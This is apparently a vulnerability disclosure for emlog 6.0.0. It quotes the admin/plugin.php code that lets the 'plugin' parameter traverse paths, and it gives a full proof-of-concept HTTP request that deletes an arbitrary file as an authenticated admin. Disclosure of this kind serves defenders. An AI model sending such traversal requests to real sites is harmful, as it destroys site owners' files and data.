emlog has any file deletion vulnerability

vulnerability in admin/plugin.php line 65:

if ($action == 'del') {
    LoginAuth::checkToken();
    $Plugin_Model = new Plugin_Model();
    $Plugin_Model->inactivePlugin($plugin);
    $pludir = preg_replace("/^([^\/]+)\/.*/", "$1", $plugin);
    if (true === emDeleteFile('../content/plugins/' . $pludir)) {
        $CACHE->updateCache('options');
        emDirect("./plugin.php?activate_del=1");
    } else {
        emDirect("./plugin.php?error_a=1");
    }
}

Get any filepath as "plugin" , will delete it.
The token parameter constructed is the value of "EM_TOKENCOOKIE_..." in the cookie.
Login management background and view /admin/plugin.php?action=del
GET plugin=anyfile,like ..\index.php something.
POC:

GET /admin/plugin.php?action=del&plugin=..\..\include\index.php&token=5e050e3e99b8a10851d49f0fd45883d5 HTTP/1.1
Host: 192.168.234.128
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:70.0) Gecko/20100101 Firefox/70.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Cookie: PHPSESSID=889tag4mo48geajtiopkmr3cr7; EM_AUTHCOOKIE_ob0n96t5QV8HTVmXGtXUMPsWTSWNWSLZ=admin%7C%7Cae6c6d2833a616b48d91c52c029cb63e; EM_TOKENCOOKIE_ea9ab1c72af2adc42fabf01c92478f75=5e050e3e99b8a10851d49f0fd45883d5
Upgrade-Insecure-Requests: 1


An issue was discovered in emlog 6.0.0
There is a any file deletion vulnerability that via /admin/plugin.php?action=del&plugin=..\..\include\index.php&token=5e050e3e99b8a10851d49f0fd45883d5
